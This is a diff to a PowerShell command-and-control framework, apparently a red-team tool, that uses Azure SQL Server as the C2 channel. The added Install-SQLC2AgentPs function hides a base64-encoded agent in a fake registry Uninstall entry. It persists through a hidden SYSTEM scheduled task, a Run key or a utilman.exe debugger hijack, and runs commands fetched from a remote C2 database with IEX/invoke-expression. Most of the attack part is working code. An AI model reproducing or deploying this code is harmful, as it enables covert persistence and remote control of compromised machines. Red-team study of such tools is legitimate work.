@@ -53,15 +53,23 @@
 	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.
 
 	    Example command:
-	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Execute
+	    Get-SQLC2Command -Verbose -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Execute
 		
-	    5. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
+	    5a. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
 	    
 	    Install-SQLC2AgentLink -Instance 'InternalSQLServer1\SQLSERVER2014' -C2Username 'CloudAdmin' -C2Password 'CloudPassword!' -C2Instance sqlcloudc2.database.windows.net -C2Database database1 -Verbose 	
 	    
 	    Note:  You can use the command below to remove the server link agent.
 	    
 	    Uninstall-SQLC2AgentLink  -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014'
+
+	    5b. Execute queued commands via a schedule task or other persistence method. This allows you to the local OS as an agent. This requires local administrative privileges.	
+	    
+	    Install-SQLC2AgentPs -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014' -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1
+	    
+	    Note:  You can use the command below to remove the installed agent.
+	    
+	    Uninstall-SQLC2AgentPs -Verbose 
 
 	    6. View command results.
 
@@ -741,7 +749,7 @@ Function Install-SQLC2Server
             return
         }        
 
-        Write-Verbose "$instance : Creating databases in Azure may timeout, but can be created manually via SSMS."
+        Write-Verbose "$instance : Note: Creating DBs on thefly in Azure times out sometimes."
         Write-Verbose "$instance : Attempting to verify and/or create the database $Database..."
 
         # Create Database Query 
@@ -762,7 +770,7 @@ Function Install-SQLC2Server
            return  
         }
 
-        Write-Verbose "$instance : Creating the C2 Table in the database $Database on $Instance."
+        Write-Verbose "$instance : Creating the C2 Table in the database $Database."
 
         # Create Database Query 
         $Query = "    
@@ -791,9 +799,9 @@ Function Install-SQLC2Server
         $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count    
         if($RowCount -eq 1)
         {
-           Write-Verbose "$instance : Verified C2 tables existed or were created in the $Database on $Instance."
+           Write-Verbose "$instance : Verified C2 tables existed or were created in the $Database."
         }else{
-           Write-Verbose "$instance : C2 tables creation failed in the $Database on $Instance failed."  
+           Write-Verbose "$instance : C2 tables creation failed in the $Database failed."  
         }
         
     }
@@ -807,9 +815,258 @@ Function Install-SQLC2Server
 
 
 # ----------------------------------
-#  Install-SQLC2AgentLink - In Progress
+#  Install-SQLC2AgentPs 
 # ----------------------------------
 # Author: Scott Sutherland
+Function Install-SQLC2AgentPs
+{
+    <#
+            .SYNOPSIS
+            This functions installs a C2 Agent on the target SQL Server by creating a server link
+            to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download
+            commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell.
+            This requires sysadmin privileges on the target server.    
+            .PARAMETER Instance
+            C2 SQL Server instance to connection to.                   
+            .PARAMETER Username
+            C2 SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            C2 SQL Server or domain account password to authenticate with.
+            .PARAMETER DatabaseName
+            Database name that contains target table on C2.
+            .PARAMETER Type
+            Type of persistence method to use.
+            .EXAMPLE
+            Connecting using current Windows credentials.
+            PS C:\> Install-SQLC2AgentPs -Verbose -Instance cloudserver1.database.windows.net -Username sa -Pasword password! -Database database1 
+             .EXAMPLE
+            Connecting using current Windows credentials.
+            PS C:\> Install-SQLC2AgentPs -Verbose -Type Task -Instance cloudserver1.database.windows.net -Username sa -Pasword password! -Database database1 
+    #>
+    [CmdletBinding()]
+    Param(
+
+        [Parameter(Mandatory = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'C2 SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'C2 SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'C2 SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Database containing target C2 table on C2 SQL Server.')]
+        [string]$Database,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Type of persistence method to use.')]
+        [ValidateSet("Task","RegRun","RegUtilman")]
+        [string]$Type = "Task",
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {
+            # check for admin privs - pending
+
+            # ------------------------------------
+            # Gather SQLC2 functions 
+            # ------------------------------------
+            Write-Verbose " - Creating SQLC2AgentPS command." 
+
+            # Setup script variable
+            $psscript = ""
+
+            Get-ChildItem -Path Function:\ |
+            Where-Object name -like "*SQLC2*" |
+            Where-Object -FilterScript {
+                $_.name -notlike '*:*'
+            } |
+            Select-Object -Property name -ExpandProperty name |
+            ForEach-Object -Process {
+
+                # Get the function code
+                $Definition = Get-Content -Path "function:\$_" -ErrorAction Stop
+
+                # $Definition                
+                $CurrentFunction = "Function $_ `n { $Definition }"
+
+                # Add function
+                $psscript = "$psscript `n $CurrentFunction"
+            }
+
+            # ------------------------------------
+            # Create SQLC2 command and store it
+            # ------------------------------------                       
+
+            # my command
+            $SQLC2Command = "Get-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Execute"
+
+            # Add custom command
+            $psscript = "$psscript `n`n $SQLC2Command"
+
+            # Encode command          
+            $psscript64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psscript)) | Out-Null
+
+            # Write command to the registry and drop IoCs
+            Write-Verbose " - Attempting to write SQLC2AgentPS payload to registry keys." 
+            if(Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\")
+            {
+                Write-Verbose " - Keys already exist."
+            }else{
+                
+                # Write keys
+                try{
+                    New-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\ -Name SQLC2AgentPS –Force | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name DisplayName -Value "SQLC2AgentPS" –Force  | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name DisplayIcon -Value "C:\Windows\System32\ComputerDefaults.exe" –Force  | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name Command -Value "$psscript64" –Force -PropertyType MultiString  | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name Publisher -Value "Bad Person" –Force | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name UninstallPath -Value "c:\windows\system32\calc.exe" –Force | Out-Null
+                    New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\ -Name UninstallString -Value "c:\windows\system32\calc.exe" –Force | Out-Null
+                    Write-Verbose " - Keys created." 
+                }catch{
+                    Write-Verbose " - Unable to write SQLC2AgentPS payload to the registry."
+                    return
+                }                
+            }
+
+            # PowerShell Arguments          
+            $PersistCommand = " -NoProfile -WindowStyle Hidden -C `"IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS' -Name Command).Command)))`""
+
+            # ------------------------------------
+            # Create scheduled task 
+            # ------------------------------------
+            if($Type -eq "Task"){
+                Write-Verbose " - Attempting to create SQLC2AgentPS scheduled task."
+                if((Get-ScheduledTask -TaskName "SQLC2AgentPS*" | Measure-Object | Select Count -ExpandProperty Count) -eq 0)
+                                                                        {
+                    try{
+                        $SystemSID = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null);
+                        $SystemAccountName = $SystemSID.Translate([System.Security.Principal.NTAccount]).Value.ToString();
+                        $Action = New-ScheduledTaskAction –Execute "powershell.exe" -Argument $PersistCommand -WorkingDirectory "C:\windows\system32\WindowsPowerShell\v1.0\"
+                        $Trigger = New-ScheduledTaskTrigger -AtLogon
+                        $Principal = New-ScheduledTaskPrincipal -UserID $SystemAccountName -LogonType ServiceAccount -RunLevel Highest
+                        $Settings = New-ScheduledTaskSettingsSet
+                        $Object = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
+                        Register-ScheduledTask "SQLC2AgentPS" -InputObject $Object | Out-Null 
+                        Write-Verbose " - Task created."
+                    }catch{
+                        Write-Verbose " - Failed to create SQLC2AgentPS scheduled task."
+                    }
+                }else{
+                        Write-Verbose " - Task already exists."
+                }
+            }        
+            
+            <#
+            # ------------------------------------
+            # Create WMI Subscription - pending updates
+            # ------------------------------------
+            # “SELECT * FROM __InstanceModificationEvent Where TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=5”            
+            Write-Verbose " - Attempting to create SQLC2AgentPS WMI subscription."
+            
+            # Create filter (trigger)
+            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+                EventNamespace = "root\cimv2"
+                Name = "SQLC2AgentPS_Filter"
+                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
+                QueryLanguage = "WQL"
+            }
+
+            # Create consumer (the command to run)
+            $Command = "PowerShell.exe $PersistCommand"
+            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+                Name = "SQLC2AgentPS_Consumer"
+                CommandLineTemplate = $Command
+            }
+
+            # Create binding (connecting the trigger and command to run)
+            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+                Name = "SQLC2AgentPS_Binding"
+                Filter = $Filter
+                Consumer = $Consumer
+            }    
+            #>       
+
+            # ------------------------------------
+            # Create registry run  
+            # ------------------------------------
+            if($Type -eq "RegRun"){
+                Write-Verbose " - Attempting to create SQLC2AgentPS registry run key."
+                $Command = "PowerShell.exe $PersistCommand"
+
+                # Check if property exists
+                try{
+                    Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ -Name SQLC2AgentPS -ErrorAction Stop | Out-Null  
+                    Write-Verbose " - Key already exists."      
+                    $RunCheck = 1
+                }catch{
+                    $RunCheck = 0
+                }
+
+                # Add property
+                if ($RunCheck -eq 0){
+
+                    try{                        
+                        New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ -Name SQLC2AgentPS -Value "$Command" –Force  | Out-Null
+                        Write-Verbose " - Key created."
+                    }catch{
+                        Write-Verbose " - Failed to create registry run key."
+                    }
+                }
+            }
+
+            # ------------------------------------
+            # Create registry utilman.exe debugger 
+            # ------------------------------------
+            if($Type -eq "RegUtilman"){
+                Write-Verbose " - Attempting to create SQLC2AgentPS registry key for utilman.exe debugger."
+                $Command = "PowerShell.exe $PersistCommand"
+                if(Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\")
+                {
+                    Write-Verbose " - Key already exists."
+                }else{
+                
+                    # Write the key                
+                    try{                     
+                        New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" -Name UtilMan.exe –Force | Out-Null
+                        New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UtilMan.exe" -Name Debugger -Value "$Command" –Force  | Out-Null
+                        Write-Verbose " - Key created."
+                    }catch{
+                        Write-Verbose " - Failed to create registry key for utilman.exe debugger."
+                    }
+                }   
+            }
+    }
+
+    End
+    {
+    }
+}
+
+
+# ----------------------------------
+#  Install-SQLC2AgentLink 
+# ----------------------------------
+# Author: Scott Sutherland
+# Todo: Fix handling of multi-line command output.
 Function Install-SQLC2AgentLink
 {
     <#
@@ -1026,15 +1283,15 @@ Function Install-SQLC2AgentLink
 		            @command=N'
 
                     -- Query server link - Register the agent
-                    IF not Exists (SELECT * FROM [$RandomLink].database1.dbo.C2Agents  WHERE servername = (select @@SERVERNAME))
-	                    INSERT [$RandomLink].database1.dbo.C2Agents (servername,agentype) VALUES ((select @@SERVERNAME),''ServerLink'')
+                    IF not Exists (SELECT * FROM [$RandomLink].$C2Database.dbo.C2Agents  WHERE servername = (select @@SERVERNAME))
+	                    INSERT [$RandomLink].$C2Database.dbo.C2Agents (servername,agentype) VALUES ((select @@SERVERNAME),''ServerLink'')
                      ELSE
-	                    UPDATE [$RandomLink].database1.dbo.C2Agents SET lastcheckin = (select GETDATE ())
+	                    UPDATE [$RandomLink].$C2Database.dbo.C2Agents SET lastcheckin = (select GETDATE ())
                         WHERE servername like (select @@SERVERNAME)
 
                     -- Get the pending commands for this server from the C2 SQL Server
                     DECLARE @output TABLE (cid int,servername varchar(8000),command varchar(8000))
-                    INSERT @output (cid,servername,command) SELECT cid,servername,command FROM [$RandomLink].database1.dbo.C2Commands WHERE status like ''pending'' and servername like @@servername
+                    INSERT @output (cid,servername,command) SELECT cid,servername,command FROM [$RandomLink].$C2Database.dbo.C2Commands WHERE status like ''pending'' and servername like @@servername
 
                     -- Run all the command for this server
                     WHILE (SELECT count(*) FROM @output) > 0 
@@ -1058,7 +1315,7 @@ Function Install-SQLC2AgentLink
 	                    select @result as result
 
 	                    -- Upload results to C2 SQL Server - need to add cid
-	                    Update [$RandomLink].database1.dbo.C2Commands set result = @result, status=''success''
+	                    Update [$RandomLink].$C2Database.dbo.C2Commands set result = @result, status=''success''
 	                    WHERE servername like @@SERVERNAME and cid like @CurrentCid
 
 	                    -- Clear the command result history
@@ -1480,8 +1737,7 @@ Function Set-SQLC2Command
         {
             if( -not $SuppressVerbose)
             {
-                Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose "$instance : Attempting to set command on C2 Server $Instance for $ServerName agent(s)."
+                Write-Verbose -Message "$Instance : Connection Success."                
                 Write-Verbose "$instance : Command: $Command"
             }
         }
@@ -1500,7 +1756,7 @@ Function Set-SQLC2Command
         # Execute Query
         $TblResults = Get-SQLC2Query -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
 
-        Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $Instance."
+        Write-Verbose "$instance : Command added for $ServerName agent(s)."
     }
 
     End
@@ -1604,7 +1860,7 @@ Function Get-SQLC2Command
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose "$instance : Attempting to grab command from $Instance."
+                Write-Verbose "$instance : Attempting to grab commands to execute."
             }
         }
         else
@@ -1628,7 +1884,7 @@ Function Get-SQLC2Command
         # check command count
         $CommandCount = $TblResults | measure | select count -ExpandProperty count
 
-        Write-Verbose "$instance : $CommandCount commands were from $Instance."
+        Write-Verbose "$instance : $CommandCount commands were found for $env:COMPUTERNAME."
     }
 
     End
@@ -1732,16 +1988,16 @@ Function Invoke-SQLC2Command
 
     Process
     {
-        Write-Verbose "Running command $Cid on $env:COMPUTERNAME"
-        Write-Verbose "Command: $Command"
+        Write-Verbose "$env:COMPUTERNAME : Running command $Cid"
+        Write-Verbose "$env:COMPUTERNAME : Command: $Command"
 
         # Run the command
         try{
             $CommandResults = invoke-expression "$Command" 
-            Write-Verbose "Command complete." 
+            Write-Verbose "$env:COMPUTERNAME : Command complete." 
             $CommandStatus = "success"
         }catch{
-            Write-Verbose "Command failed. Aborting." 
+            Write-Verbose "$env:COMPUTERNAME : Command failed. Aborting." 
             $CommandStatus = "failed"
         }                         
 
@@ -1778,7 +2034,7 @@ Function Invoke-SQLC2Command
         Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null
 
         # Setup query to grab commands      
-        Write-Verbose -Message "$Instance : Send command results to $Instance for command $Cid."  
+        Write-Verbose -Message "$Instance : Uploading command results to C2 server."  
         $Query = "
              -- update command request from server            
 	        UPDATE dbo.C2COMMANDS SET lastupdate = (select GETDATE ()),result = '$CommandResults',status='$CommandStatus',command='$Command'
@@ -1787,10 +2043,7 @@ Function Invoke-SQLC2Command
         # Execute Query
         $TblResults = Get-SQLC2Query -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
 
-        # check command count
-        $CommandCount = $TblResults.row.count 
-
-        Write-Verbose "$instance : Update sent."        
+        Write-Verbose "$instance : Upload complete."        
     }
 
     End
@@ -1931,7 +2184,7 @@ Function Get-SQLC2Result
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose "$instance : Attempting to grab command from $env:COMPUTERNAME ."
+                Write-Verbose "$instance : Attempting to grab pending and processed commands."
             }
         }
         else
@@ -1950,14 +2203,14 @@ Function Get-SQLC2Result
             $FilterStatus
             $FilterCid
             "
-            $Query
+
         # Execute Query
         $TblResults = Get-SQLC2Query -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
 
         # check command count
         $CommandCount = $TblResults.row.count 
 
-        Write-Verbose "$instance : $CommandCount commands were from $env:COMPUTERNAME."
+        Write-Verbose "$instance : $CommandCount commands were found."
     }
 
     End
@@ -2219,6 +2472,133 @@ Function Remove-SQLC2Agent
 
 
 # ----------------------------------
+#  Uninstall-SQLC2AgentPs
+# ----------------------------------
+# Author: Scott Sutherland
+Function Uninstall-SQLC2AgentPs
+{
+    <#
+            .SYNOPSIS
+            This command removes the SQLC2 scheduled task and WMI subscription agent beacons from the current system. 
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance                              
+            .EXAMPLE
+            PS C:\> Uninstall-SQLC2AgentPs -verbose
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        Write-Verbose "Attempting to remove the SQLC2 persistence methods."
+    }
+
+    Process
+    {
+        # Remove the schedule tasks
+        Write-Verbose "Remove Scheduled Task."
+        if((Get-ScheduledTask -TaskName "SQLC2AgentPS*" | Measure-Object | Select Count -ExpandProperty Count) -eq 1)
+        {
+            try{
+                Unregister-ScheduledTask -TaskName "SQLC2AgentPS" -Confirm:$false
+                Write-Verbose " - Scheduled task removed."
+            }catch{
+                Write-Verbose " - Task could not be removed."
+            }
+        }else{
+            Write-Verbose " - SQLC2PS Scheduled task does not exist."
+        }
+
+        <#
+        # Remove the WMI subscription
+        Write-Verbose "Remove WMI Subscription."        
+
+        # Remove WMI Filter
+        # Write-Verbose " - Checking for filter."
+        if((Get-WmiObject -Namespace root/subscription -Class __EventFilter | where name -like “*SQLC2PS_Filter*”).count -eq 1)
+        {
+            Write-Verbose " - Removing SQLC2AgentPS WMI filter."
+            Get-WmiObject -Namespace root/subscription -Class __EventFilter | where name -like “*SQLC2AgentPS_Filter*” | Remove-WmiObject
+        }else{
+            Write-Verbose " - SQLC2AgentPS WMI filter does not exist."
+        }
+
+        # Remove WMI Consumer
+        # Write-Verbose " - Checking for consumer."
+        if((Get-WmiObject -Namespace root/subscription -Class __EventConsumer | where name -like “SQLC2AgentPS_Consumer*”).count -eq 1)
+        { 
+            Write-Verbose " - Removing SQLC2AgentPS WMI consumer."
+            Get-WmiObject -Namespace root/subscription -Class __EventConsumer | where name -like “SQLC2AgentPS_Consumer*” | Remove-WmiObject
+        }else{
+            Write-Verbose " - SQLC2AgentPS WMI consumer does not exist."
+        }
+
+        # Remove WMI Binding
+        # Write-Verbose " - Checking for binding."
+        if((Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | where name -like “*SQLC2AgentPS_Binding*”).count -eq 1)
+        {
+            Write-Verbose " - Removing SQLC2AgentPS WMI binding."
+            Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | where name -like “*SQLC2AgentPS_Binding*” | Remove-WmiObject
+        }else{
+            Write-Verbose " - SQLC2AgentPS WMI binding does not exist."
+        }
+        #>
+
+        # Remove the registry run keys
+        Write-Verbose "Remove registry run keys."
+        try{
+            Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ -Name SQLC2AgentPS -ErrorAction Stop | Out-Null        
+            Remove-ItemProperty  -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ -Name SQLC2AgentPS -ErrorAction SilentlyContinue  | Out-Null
+            Write-Verbose " - Registry run keys removed."
+        }catch{
+            Write-Verbose " - SQLC2AgentPS run registry key does not exist."
+        }
+
+        # Remove utilman.exe debugger from registry
+        Write-Verbose "Remove utilman.exe debugger registry keys."
+        if(Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\")
+        {
+            try{
+                Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+                Write-Verbose " - Utilman.exe debugger registry keys removed."
+            }catch{
+                Write-Verbose " - Unable to remove registry key HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe."
+            }
+        }else{
+            Write-Verbose " - SQLC2AgentPS utilman.exe debugger registry key does not exist."
+        }
+
+        # Remove payload from registry
+        Write-Verbose "Remove payload registry keys."
+        if(Test-Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\)
+        {
+            try{
+                Remove-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\
+                Write-Verbose " - Registry keys removed."
+            }catch{
+                Write-Verbose " - Unable to remove registry key HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SQLC2AgentPS\."
+            }
+        }else{
+            Write-Verbose " - SQLC2AgentPS payload registry key does not exist."
+        }
+    }
+
+    End
+    {
+    }
+ }
+
+
+# ----------------------------------
 #  Uninstall-SQLC2AgentLink
 # ----------------------------------
 # Author: Scott Sutherland
@@ -2233,7 +2613,8 @@ Function Uninstall-SQLC2AgentLink
             SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
             SQL Server credential.
-            .PARAMETER Instance                              
+            .PARAMETER Instance
+            The instance of the C2 link agent.                              
             .EXAMPLE
             PS C:\> Uninstall-SQLC2Agent -Verbose -Instance "SQLServer1\STANDARDDEV2014" -Username sa -Password 'MyPassword123!'
             .EXAMPLE
@@ -2308,7 +2689,7 @@ Function Uninstall-SQLC2AgentLink
             return
         }     
         
-        # Setup query to grab commands        
+        # Setup query       
         $Query = "
                 -- Remove server link to SQL C2 Server
                 IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'SQLC2Server') = 1
@@ -2328,6 +2709,125 @@ Function Uninstall-SQLC2AgentLink
 
     End
     {
+        Write-Verbose "$instance : Done."
+    }
+ }
+
+
+# ----------------------------------
+#  Uninstall-SQLC2Server
+# ----------------------------------
+# Author: Scott Sutherland
+Function Uninstall-SQLC2Server
+{
+    <#
+            .SYNOPSIS
+            This command removes the C2 related tables on the C2 SQL Server. 
+            .PARAMETER Instance
+            C2 SQL Server instance.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.                            
+            .EXAMPLE
+            PS C:\> Uninstall-SQLC2Server -Verbose -Instance "mysqlserver.database.windows.net" -Database Database1 -Username sa -Password 'MyPassword123!'
+            .EXAMPLE
+            PS C:\> Uninstall-SQLC2Server -Verbose -Instance "SQLServer1\STANDARDDEV2014" -Database Database1
+    #>
+    [CmdletBinding()]
+    Param(
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server database used to store the C2 tables.')]
+        [string]$Database,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-SQLC2ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLC2ConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+                Write-Verbose "$instance : Attempting to remove the C2 tables from $Database database on $Instance."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }     
+        
+        # Setup query to grab commands        
+        $Query = "
+
+                -- Remove command table
+                IF(SELECT count(*) FROM [INFORMATION_SCHEMA].[TABLES] WHERE TABLE_NAME like 'C2COMMANDS') = 1
+	                DROP TABLE C2COMMANDS
+                ELSE
+	                SELECT 'C2COMMANDS table does not exist.'
+
+                -- Remove agent table
+                IF(SELECT count(*) FROM [INFORMATION_SCHEMA].[TABLES] WHERE TABLE_NAME like 'C2AGENTS') = 1
+	                DROP TABLE C2AGENTS
+                ELSE
+	                SELECT 'C2AGENTS table does not exist.'"
+
+        # Execute Query
+        $TblResults = Get-SQLC2Query -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        if(($TblResults | Measure-Object | Select count -ExpandProperty count) -eq 1){
+            Write-Verbose -Message "$Instance : C2 tables did not exist."
+        }
+    }
+
+    End
+    {
+        Write-Verbose "$instance : Please note that any databases create with have to be removed manually."
         Write-Verbose "$instance : Done."
     }
  }
